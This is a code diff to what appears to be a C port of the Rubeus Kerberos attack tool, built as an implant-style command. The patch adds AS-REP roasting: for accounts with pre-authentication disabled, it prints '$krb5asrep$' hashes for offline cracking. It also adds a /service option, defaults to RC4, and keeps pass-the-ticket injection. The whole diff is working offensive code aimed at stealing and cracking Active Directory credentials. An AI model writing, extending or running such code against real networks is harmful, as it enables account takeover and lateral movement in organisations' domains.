@@ -328,26 +328,27 @@ BOOL NewAS_REQ( char* pcUsername, char* pcDomain, EncryptionKey encKey, BOOL ops
         }
 
         as_req->req_body.sname.name_count  = partsCount;
-        as_req->req_body.sname.name_string = MemAlloc(sizeof(void*) * as_req->req_body.cname.name_count);
-        as_req->req_body.sname.name_type   = PRINCIPAL_NT_PRINCIPAL;
+        as_req->req_body.sname.name_string = MemAlloc(sizeof(void*) * partsCount);
+        as_req->req_body.sname.name_type   = (partsCount > 1) ? PRINCIPAL_NT_SRV_INST : PRINCIPAL_NT_PRINCIPAL;
 
         int partIndex = 0;
         int startIndex = 0;
         index = 0;
         while (service[index] && partIndex < partsCount) {
             if (service[index] == '/') {
-                if (my_copybuf(&(as_req->req_body.sname.name_string[partIndex]), service + startIndex, index + 1 - startIndex)) return TRUE;
-                as_req->req_body.sname.name_string[partIndex][index] = 0;
+                int partLen = index - startIndex;
+                if (my_copybuf(&(as_req->req_body.sname.name_string[partIndex]), service + startIndex, partLen + 1)) return TRUE;
+                as_req->req_body.sname.name_string[partIndex][partLen] = 0;
                 startIndex = index + 1;
                 partIndex++;
             }
             index++;
         }
-        if (my_copybuf(&(as_req->req_body.sname.name_string[partIndex]), service + startIndex, index + 1 - startIndex)) return TRUE;
+        if (my_copybuf(&(as_req->req_body.sname.name_string[partIndex]), service + startIndex, index - startIndex + 1)) return TRUE;
     }
     else {
         as_req->req_body.sname.name_count = 2;
-        as_req->req_body.sname.name_string = MemAlloc(sizeof(void*) * as_req->req_body.cname.name_count);
+        as_req->req_body.sname.name_string = MemAlloc(sizeof(void*) * 2);
         as_req->req_body.sname.name_type = PRINCIPAL_NT_SRV_INST;
         if (my_copybuf(&(as_req->req_body.sname.name_string[0]), "krbtgt", 7)) return TRUE;
         if (my_copybuf(&(as_req->req_body.sname.name_string[1]), pcDomain, my_strlen(pcDomain) + 1)) return TRUE;
@@ -490,12 +491,42 @@ BOOL NoPreAuthTGT(char* user, char* domain, EncryptionKey encKey, char* domainCo
         if (verbose)
             PRINT_OUT("[-] AS-REQ w/o preauth successful! %s has pre-authentication disabled!\n", user);
 
-        if (encKey.key_value > 0) {
+        if (encKey.key_value != NULL) {
             byte* kirbiBytes = NULL;
             if (HandleASREP(responseAsn, encKey, NULL, FALSE, domainController, &kirbiBytes)) return TRUE;
             *ret = TRUE;
             if (ptt)
                 PTT(NULL, kirbiBytes);
+        }
+        else {
+            // No key provided - output AS-REP hash for offline cracking
+            AS_REP as_rep = { 0 };
+            if (NewAS_REP(responseAsn, &as_rep)) return TRUE;
+
+            // Format: $krb5asrep$etype$user@domain:cipher
+            char* etype_str = "23";
+            if (as_rep.enc_part.etype == aes256_cts_hmac_sha1)
+                etype_str = "18";
+            else if (as_rep.enc_part.etype == aes128_cts_hmac_sha1)
+                etype_str = "17";
+
+            // Convert cipher to hex
+            int hexLen = as_rep.enc_part.cipher_size * 2 + 1;
+            char* hexCipher = MemAlloc(hexLen);
+            my_tohex(as_rep.enc_part.cipher, as_rep.enc_part.cipher_size, hexCipher, hexLen);
+
+            // Extract first 32 hex chars as checksum (16 bytes)
+            char checksum[33] = { 0 };
+            for (int i = 0; i < 32 && i < hexLen - 1; i++)
+                checksum[i] = hexCipher[i];
+
+            // Rest is the encrypted data
+            char* encData = hexCipher + 32;
+
+            PRINT_OUT("\n[*] AS-REP hash for offline cracking:\n\n");
+            PRINT_OUT("$krb5asrep$%s$%s@%s:%s$%s\n\n", etype_str, user, domain, checksum, encData);
+
+            *ret = TRUE;
         }
     }
     else if (responseAsn.tagValue == KERB_ERROR) {
@@ -504,6 +535,9 @@ BOOL NoPreAuthTGT(char* user, char* domain, EncryptionKey encKey, char* domainCo
         if (error_code == 0x19) { // KDC_ERR_PREAUTH_REQUIRED
             if (verbose)
                 PRINT_OUT("[!] Pre-Authentication required!\n");
+        }
+        else {
+            PRINT_OUT("\n\t[x] Kerberos error : %d\n", error_code);
         }
         *ret = FALSE;
     }
@@ -515,7 +549,7 @@ BOOL NoPreAuthTGT(char* user, char* domain, EncryptionKey encKey, char* domainCo
     return FALSE;
 }
 
-BOOL AskTGT_hash(char* user, char* domain, char* password, int currentEtype, int encType, BOOL opsec, BOOL pac, BOOL describe, BOOL ptt, char* dc, byte** kirbiBytes) {
+BOOL AskTGT_hash(char* user, char* domain, char* password, int currentEtype, int encType, BOOL opsec, BOOL pac, BOOL describe, BOOL ptt, char* dc, char* service, byte** kirbiBytes) {
     EncryptionKey encKey = { 0 };
     if (CreateEncKey(domain, user, password, currentEtype, encType, &encKey)) return TRUE;
 
@@ -527,7 +561,7 @@ BOOL AskTGT_hash(char* user, char* domain, char* password, int currentEtype, int
         PRINT_OUT("[*] Building AS-REQ (w/ preauth) for: '%s\\%s'\n", domain, user);
 
         AS_REQ userHashASREQ = { 0 };
-        if (NewAS_REQ(user, domain, encKey, opsec, pac, FALSE, NULL, &userHashASREQ)) return TRUE;
+        if (NewAS_REQ(user, domain, encKey, opsec, pac, FALSE, service, &userHashASREQ)) return TRUE;
 
         AsnElt requestAsn = { 0 };
         if (ReqToAsnEncode(userHashASREQ, 10, &requestAsn)) return TRUE;
@@ -577,7 +611,8 @@ void ASK_TGT_RUN( PCHAR Buffer, DWORD Length ) {
     char* s_enctype = NULL;
     char* cert      = NULL;
     char* hash      = NULL;
-    int   encType   = subkey_keymaterial;
+    char* service   = NULL;
+    int   encType   = rc4_hmac;
     int   curEType  = 0;
     BOOL  ptt       = FALSE;
     BOOL  opsec     = FALSE;
@@ -590,6 +625,7 @@ void ASK_TGT_RUN( PCHAR Buffer, DWORD Length ) {
         i += GetStrParam(Buffer + i, Length - i, "/password:", 10, &password );
         i += GetStrParam(Buffer + i, Length - i, "/dc:", 4, &dc );
         i += GetStrParam(Buffer + i, Length - i, "/enctype:", 9, &s_enctype );
+        i += GetStrParam(Buffer + i, Length - i, "/service:", 9, &service );
         i += IsSetParam(Buffer + i, Length - i, "/ptt", 4, &ptt );
         i += IsSetParam(Buffer + i, Length - i, "/opsec", 6, &opsec );
         i += IsSetParam(Buffer + i, Length - i, "/nopac", 6, &pac );
@@ -607,9 +643,7 @@ void ASK_TGT_RUN( PCHAR Buffer, DWORD Length ) {
     }
     pac = !pac;
 
-    if(password)
-        encType = rc4_hmac;
-
+    // /enctype overrides default encType (for password-based auth)
     if( s_enctype ) {
         if (my_strcmp(s_enctype, "rc4") == 0)
             encType = rc4_hmac;
@@ -657,7 +691,7 @@ void ASK_TGT_RUN( PCHAR Buffer, DWORD Length ) {
             //PRINT_OUT("Ask.TGT(user, domain, certificate);\n");
         }
         else {
-            AskTGT_hash(user, domain, password, curEType, encType, opsec, pac, TRUE, ptt, dc, &ticket);
+            AskTGT_hash(user, domain, password, curEType, encType, opsec, pac, TRUE, ptt, dc, service, &ticket);
         }
     }
 }
